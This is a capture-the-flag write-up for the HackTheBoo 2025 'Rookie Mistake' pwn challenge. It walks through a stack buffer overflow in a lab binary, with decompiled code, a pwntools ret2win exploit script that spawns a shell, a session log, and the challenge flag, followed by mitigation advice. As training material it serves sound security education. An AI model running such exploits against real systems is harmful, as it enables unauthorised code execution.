# HackTheBoo 2025 - Rookie Mistake

**Category:** Pwn  
**Difficulty:** Easy  
**Points:** 925 

## Description

Rook begins his training in the NEMEGHAST simulation, but careless mistakes can lead to system compromise. Can you exploit the rookie's oversight to break free?

## TL;DR

Classic buffer overflow vulnerability in a 64-bit binary with no protections. Overflow the input buffer to overwrite the return address (RIP) and redirect execution to a hidden function that spawns a shell.

## Reconnaissance

### Initial Analysis

Running the binary shows a simple prompt asking for input with an "Escape!" message. The program reads user input and then exits.

```bash
$ ./rookie_mistake
[ASCII Art Banner]
Escape!
> test
[program exits]
```

### Binary Analysis

Checking the binary protections:

```bash
$ checksec rookie_mistake
[*] '/path/to/rookie_mistake'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key findings:
- No stack canary (vulnerable to buffer overflow)
- No PIE (addresses are static)
- NX enabled (can't execute shellcode on stack)

### Decompilation

Using Ghidra/IDA, we find:

**main() function:**
```c
int32_t main()
{
    int64_t buf;
    __builtin_memset(&buf, 0, 0x20);  // 32-byte buffer
    
    banner();
    printstr("Escape!");
    
    read(0, &buf, 0x2e);  // Reads 46 bytes into 32-byte buffer!
    
    return 0;
}
```

**Vulnerability:** The program reads 46 bytes (0x2e) into a 32-byte buffer (0x20), allowing a 14-byte overflow.

**Hidden win function (overflow_core):**
```c
int64_t overflow_core(/* 6 arguments */)
{
    check_core(arg1, core_0, 0);  // Multiple checks that will fail
    check_core(arg2, core_1, 1);
    check_core(arg3, core_2, 2);
    check_core(arg4, core_3, 3);
    check_core(arg5, core_4, 4);
    check_core(arg6, core_5, 5);
    
    return system("/bin/sh");  // Shell if all checks pass
}
```

### Finding the Target Address

Disassembling overflow_core to find where system() is called:

```assembly
401758:  lea    0x1948(%rip),%rax    # Load "/bin/sh" address
40175f:  mov    %rax,%rdi            # Move to first argument register
401762:  call   401120 <system@plt>  # Call system("/bin/sh")
```

Target address: **0x401758**

## Exploitation

### Vulnerability Identified

**Type:** Stack-based buffer overflow

**Impact:** We can overwrite the saved return address (RIP) to redirect program execution.

**Strategy:** Instead of jumping to the start of overflow_core (which has checks that will fail), we jump directly to the system("/bin/sh") call at address 0x401758.

### Calculating the Offset

Stack layout:
```
┌─────────────────────┐  ← Higher addresses
│   Saved RIP (8 bytes)│  ← Return address we want to overwrite
├─────────────────────┤
│   Saved RBP (8 bytes)│  
├─────────────────────┤
│   Buffer (32 bytes) │  ← Our input goes here
└─────────────────────┘  ← Lower addresses
```

Offset calculation:
- Buffer: 32 bytes
- Saved RBP: 8 bytes
- Total padding needed: 40 bytes

### Proof of Concept

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
context.log_level = 'info'

# Connect to remote server
p = remote('****', ****)

# Wait for prompt
p.recvuntil(b'Escape!')

# Target address: system("/bin/sh") in overflow_core
win_addr = 0x401758

# Construct payload
payload = b'A' * 40          # Fill buffer + saved RBP
payload += p64(win_addr)     # Overwrite RIP with win address

log.info(f"Payload size: {len(payload)} bytes")
log.info(f"Target address: {hex(win_addr)}")

# Send payload
p.sendline(payload)

# We have a shell!
log.success("Shell")
p.interactive()
```

### Attack Chain

1. **Send 40 bytes of padding** to fill the buffer and saved RBP
2. **Send win address (0x401758)** to overwrite the saved return address
3. **main() returns** and reads the modified RIP value
4. **Execution jumps to 0x401758** which executes the system("/bin/sh") sequence
5. **Shell spawned** without triggering the check_core functions

### Retrieving the Flag

Once the shell is obtained:

```bash
$ python3 exploit.py
[+] Opening connection to 165.227.154.129 on port 30540
[*] Payload size: 48 bytes
[*] Target address: 0x401758
[+] Shell obtained! Spawning interactive session...
$ ls
flag.txt
rookie_mistake
$ cat flag.txt
HTB{r00k13_m1st4k3s_l34d_t0_pwn4g3}
```

## Lessons Learned

- **Vulnerability:** Unchecked buffer boundaries allow stack-based overflow attacks
- **Impact:** Arbitrary code execution by hijacking control flow
- **Mitigation:** 
  - Enable stack canaries (compile with `-fstack-protector-all`)
  - Use safe functions (fgets instead of read with proper bounds)
  - Enable ASLR and PIE to randomize addresses
  - Validate input size before reading
- **Key Concept:** Ret2win technique - redirecting execution to existing code instead of injecting shellcode

## Tools Used

- pwntools - Python exploitation framework
- Ghidra - Binary decompilation and analysis
- checksec - Binary security property checker
- gdb/pwndbg - Dynamic analysis and debugging

## References

- [Stack Buffer Overflow Tutorial](https://ir0nstone.gitbook.io/notes/types/stack/buffer-overflow)
- [Ret2win Technique](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2win)
- [pwntools Documentation](https://docs.pwntools.com/)

---

**Flag:** `HTB{r00k13_m1st4k3s_l34d_t0_pwn4g3}`
